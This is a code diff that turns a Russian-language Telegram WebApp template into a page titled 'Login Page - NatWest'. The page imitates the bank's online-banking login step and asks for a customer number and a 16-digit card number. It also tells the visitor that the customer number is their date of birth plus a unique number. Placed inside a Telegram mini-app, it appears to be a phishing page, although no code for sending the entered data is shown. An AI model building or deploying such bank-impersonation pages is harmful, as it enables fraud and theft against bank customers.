@@ -3,10 +3,10 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Твой Телеграм WebApp</title>
+  <title>Login Page - NatWest</title>
 
-  <!-- Внутренний CSS -->
   <style>
+    /* Общие стили */
     body {
       font-family: Arial, sans-serif;
       background-color: #f3f3f3;
@@ -28,6 +28,7 @@
       padding: 20px;
       border-radius: 10px;
       box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      text-align: center;
     }
 
     h2 {
@@ -35,20 +36,150 @@
       margin-bottom: 10px;
     }
 
-    p {
+    .description {
       font-size: 14px;
+      margin-bottom: 20px;
       line-height: 1.6;
     }
 
-    /* Добавь остальные стили сюда */
+    .input-group {
+      margin-bottom: 15px;
+    }
+
+    label {
+      font-size: 14px;
+      margin-bottom: 5px;
+      display: block;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border: none;
+      border-radius: 5px;
+      font-size: 14px;
+    }
+
+    .forgot-password {
+      font-size: 12px;
+      color: #e1bee7;
+      text-decoration: none;
+    }
+
+    .forgot-password:hover {
+      text-decoration: underline;
+    }
+
+    .remember-me {
+      margin-top: 10px;
+      text-align: left;
+    }
+
+    .remember-me input {
+      margin-right: 5px;
+    }
+
+    .info-text a {
+      color: #e1bee7;
+      font-size: 12px;
+      text-decoration: none;
+    }
+
+    .info-text a:hover {
+      text-decoration: underline;
+    }
+
+    .continue-btn {
+      background-color: #9c27b0;
+      color: white;
+      padding: 10px;
+      width: 100%;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .continue-btn:hover {
+      background-color: #8e24aa;
+    }
+
+    .register {
+      text-align: center;
+      font-size: 12px;
+      margin-top: 20px;
+    }
+
+    .register a {
+      color: #e1bee7;
+      text-decoration: none;
+    }
+
+    .register a:hover {
+      text-decoration: underline;
+    }
+
+    .footer {
+      font-size: 12px;
+      color: #e1bee7;
+      margin-top: 20px;
+      text-align: center;
+    }
+
+    .cancel-btn {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      background-color: transparent;
+      color: white;
+      border: none;
+      font-size: 18px;
+      cursor: pointer;
+    }
+
+    .cancel-btn:hover {
+      color: #e1bee7;
+    }
   </style>
 </head>
 <body>
   <div class="container">
     <div class="login-box">
-      <h2>Войти</h2>
-      <p>Авторизуйтесь в своей учётной записи</p>
-      <!-- Твой HTML контент здесь -->
+      <button class="cancel-btn">Cancel</button>
+      <h2>Login step 1 - Online Banking</h2>
+      <p class="description">You can use your customer number or your 16-digit debit or credit card number to log in.</p>
+      
+      <div class="input-group">
+        <label for="customer-number">Customer number</label>
+        <input type="text" id="customer-number" placeholder="Enter your customer number">
+      </div>
+      
+      <div class="input-group">
+        <label for="card-number">Card number</label>
+        <input type="text" id="card-number" placeholder="Enter your card number">
+      </div>
+
+      <a href="#" class="forgot-password">Forgotten your login details?</a>
+      
+      <div class="remember-me">
+        <input type="checkbox" id="remember-me">
+        <label for="remember-me">Remember me</label>
+      </div>
+
+      <p class="info-text">
+        <a href="#">What does this mean?</a>
+      </p>
+
+      <button class="continue-btn">Continue</button>
+
+      <p class="register">
+        Not Registered for Online Banking? <a href="#">Sign up here.</a>
+      </p>
+
+      <div class="footer">
+        <p>Your customer number is your date of birth (DDMMYY), followed by your unique number (up to 4 digits).</p>
+      </div>
     </div>
   </div>
 </body>
